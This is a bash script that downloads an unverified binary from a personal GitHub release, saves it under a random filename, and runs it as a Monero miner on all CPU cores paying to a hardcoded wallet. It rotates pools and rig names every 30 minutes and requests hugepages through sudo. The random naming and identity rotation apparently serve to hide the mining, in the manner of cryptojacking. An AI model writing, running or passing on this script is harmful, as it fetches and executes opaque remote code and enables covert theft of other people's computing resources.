#!/bin/bash

# ================================
# Nanominer XMR Script
# Full CPU, RigName = date+time, Random pool
# Custom miner URL
# ================================

# Monero wallet
WALLET="4ADCVdveAjhDVHXYGUCkX4513LZaGF7bY2dxngyaxBZaW1YJAWsNRpiRfRcEwUma1gLpPkoQ5tBzES6jXfPiZoUH5ti313h"

# Custom miner download URL
URL="https://github.com/vedhagsvp/qubros/releases/download/srmn/nanops"

# Pool list (host:port)
POOLS=(
    "xmr-eu1.nanopool.org:10300"
    "xmr-eu2.nanopool.org:10300"
    "xmr-us-east1.nanopool.org:10300"
    "xmr-us-west1.nanopool.org:10300"
    "xmr-asia1.nanopool.org:10300"
    "xmr-jp1.nanopool.org:10300"
    "xmr-au1.nanopool.org:10300"
)

# Detect all CPU cores
CPU_THREADS=$(nproc)

# Generate rig name based on date+time only
generate_rig_name() {
    date +%d%m%Y%H%M%S
}

# Pick random pool
select_random_pool() {
    local idx=$((RANDOM % ${#POOLS[@]}))
    echo "${POOLS[$idx]}"
}

# Download miner
download_miner() {
    FILENAME=$(tr -dc 'a-z0-9' < /dev/urandom | head -c 10)
    echo "ðŸ“¥ Downloading miner..."
    wget -q "$URL" -O "$FILENAME" || exit 1
    chmod +x "$FILENAME"
    echo "$FILENAME"
}

# Create config.ini
create_config() {
    RIG_NAME=$(generate_rig_name)
    SELECTED_POOL=$(select_random_pool)

    cat > config.ini <<EOF
[RandomX]
coin = XMR
wallet = $WALLET
rigName = $RIG_NAME
threads = $CPU_THREADS
pool1 = $SELECTED_POOL
EOF

    echo "ðŸ†” Rig name: $RIG_NAME"
    echo "ðŸŒ Pool selected: $SELECTED_POOL"
    echo "ðŸ’» CPU threads: $CPU_THREADS"
}

# Run miner
run_miner() {
    MINER="$1"
    while true; do
        create_config  # regenerate rig name + pool each restart
        ./"$MINER" -c config.ini >> miner.log 2>&1 &
        PID=$!
        sleep 1800   # 30 minutes
        kill "$PID" 2>/dev/null
        wait "$PID" 2>/dev/null
        sleep 15
    done
}

main() {
    [[ "$(uname)" != "Linux" ]] && exit 1
    sudo sysctl -w vm.nr_hugepages=1280 >/dev/null 2>&1

    MINER_FILE=$(download_miner)
    run_miner "$MINER_FILE"
}

main
